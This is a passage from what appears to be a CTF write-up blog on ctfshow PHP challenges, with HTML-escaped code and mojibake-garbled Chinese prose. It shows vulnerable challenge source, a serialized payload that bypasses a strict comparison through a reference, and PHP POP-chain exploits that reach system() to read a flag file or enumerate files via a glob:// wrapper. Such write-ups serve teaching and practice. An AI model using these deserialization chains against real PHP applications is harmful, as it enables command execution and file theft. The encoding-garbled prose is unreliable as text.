&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;ÁªôÊàëÁúãÁúã!&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;script&amp;gt;window.alert(&amp;#39;ËøôÊòØ‰∏çËÉΩËØ¥ÁöÑÁßòÂØÜ&amp;#39;);location.href=&amp;#39;https://www.bilibili.com/video/BV1CW411g7UF&amp;#39;;&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊòØÂá†‰∏™Â∞ètrickÁöÑÂêàÈõÜÔºå‰∏çÈöæ&lt;/p>
&lt;ul>
&lt;li>&lt;code>extract()&lt;/code>ÂèØ‰ª•ÂèòÈáèË¶ÜÁõñ&lt;/li>
&lt;li>&lt;code>$this-&amp;gt;your_answer === $this-&amp;gt;name&lt;/code>ËøôÊ†∑ÁöÑÂº∫ÊØîËæÉÂèØ‰ª•Áî®ÊåáÈíàÂèñÂú∞ÂùÄÊñπÂºèÁªïËøá&lt;/li>
&lt;/ul>
&lt;p>exp&lt;/p>
&lt;pre tabindex="0">&lt;code>$test = new whoami();
$test-&amp;gt;your_answer=&amp;amp;$test-&amp;gt;name;
echo serialize($test);
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B%21
POST: secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22ctfshow%E7%AC%AC%E4%B8%80%E6%B7%B1%E6%83%85%22%3Bs%3A11%3A%22your%5Fanswer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3Bs%3A8%3A%22I%5Flove%5Fu%22%3B%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111233756111.png" alt="image-20211111233756111">&lt;/p>
&lt;h2 id="Ë∞ÅÊòØctf‰πãÁéã">Ë∞ÅÊòØctf‰πãÁéãÔºü&lt;/h2>
&lt;blockquote>
&lt;p>ÊçÆËØ¥ËæìÂÖ•Ê°ÜËÉΩËøûËµ∑Êù•ÁöÑ&lt;/p>
&lt;/blockquote>
&lt;p>f12ÂèØ‰ª•ÁúãÂà∞ÊèêÁ§∫/ssti.html&lt;/p>
&lt;p>ÁÑ∂ÂêéÊ≤°Âï•ÂèØËØ¥ÁöÑÔºåÂéüÈ¢òÔºå‰∏ÄÁÇπÈÉΩÊ≤°ÊîπÔºåÁõ¥Êé•Áúã‰πãÂâçÁöÑÂçöÂÆ¢-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[DigitalOverdoseCTF 2021]madlib&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111235757667.png" alt="image-20211111235757667">&lt;/p>
&lt;p>yysyÔºåÁúãÂà∞Ëøô‰∏™hintÊàëÂ∞±Â∑≤ÁªèÊÑèËØÜÂà∞ÊòØÂú®ËÄÉËøô‰∏™È¢ò‰∫ÜÔºåÊûúÁÑ∂ÔºåÊ≤°Êãø‰∏ä‰∏ÄË°ÄÂèØÊÉú‰∫Ü&lt;/p>
&lt;h2 id="easypop">easypop&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$fun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$wo&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">fun&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">fun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ÈòøÁ•ñÊî∂ÊâãÂêßÔºåÂ§ñÈù¢ÊúâÂ•óÁ•û&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$p&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">getFlag&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshow&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshow&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$wo&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">phpinfo&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpÁâàÊú¨7.3Âì¶ÔºåÊ≤°Êúâ‰∫∫ÂèØ‰ª•ÂÜçÁªïËøáÊàë‰∫Ü&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$function&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$function&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$ran&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$rce&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;ÈÄÅÁªô‰Ω†‰∫Ü&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$rce&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/action_2/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">get_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Âï•‰πüÊ≤°Êúâ&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$jia&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pop&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$pop&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pop&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pop&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/php/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Â•óÁ•ûÈªëËøõËøôÈáåÂπ∂Áªô‰Ω†‰∫Ü‰∏Ä‰∏™ÊèêÁ§∫ÔºöÊñá‰ª∂ÂêçÊòØfÂºÄÂ§¥ÁöÑÂΩ¢Â¶ÇfA6_ÂΩ¢ÂºèÁöÑÊñá‰ª∂&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;‰∏çÂèØ‰ª•Áî®‰º™ÂçèËÆÆÂì¶&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂÖàÁõ¥Êé•ÊîæpayloadÊääÔºåÁõ¥Êé•Áî®ÁöÑaction_3ÁöÑrce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;action_3&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;cat /fz3_.txt&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ëøô‰∏™Â∫îËØ•ÊØîËæÉÁÆÄÂçïÔºå‰∏çÁî®ÂàÜÊûêÈÉΩËÉΩÁúãÊòéÁôΩ&lt;/p>
&lt;p>ÂÆòÊñπwpÁöÑÈ¢ÑÊúüËß£ÈïøËøôÊ†∑-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#Nb2X8y">wp&lt;/a>ÔºåÈ¶ñÂÖàÁî®Âà∞‰∫ÜphpÁöÑÂÜÖÁΩÆÁ±ªDirectoryIteratorÈÖçÂêàglob‰º™ÂçèËÆÆÁàÜÁ†¥flagÊñá‰ª∂Âêç&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;DirectoryIterator&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//GlobIterator
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;glob:///f[A-z][0-9]_*&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ëøô‰∏™Á°ÆÂÆûÔºå‰ΩÜÊòØ‰πãÂêéÁöÑ&lt;code>call_user_func&lt;/code>ÔºåÊàëÂè™ËÉΩËØ¥ Êúâ‰∏ÄËØ¥‰∏Ä ÊàëÊòØÊ≤°Â§çÁé∞ÊàêÂäü&lt;/p>
&lt;p>ËøôÈáåÁöÑÊ≠ª‰∫°wakeupÊ∞∏Ëøú‰ºöÊØîcallÂÖàË∞ÉÁî®ÔºåfuncËøôÈáåËøòÊ≤°Âà∞call_user_funcÂ∞±ÂÖàË¢´Ê∏ÖÁ©∫‰∫ÜÔºåÊÄé‰πàÊâßË°åÔºüÔºüÔºü&lt;/p>
&lt;h2 id="ËøëÂú®ÁúºÂâç">ËøëÂú®ÁúºÂâç&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
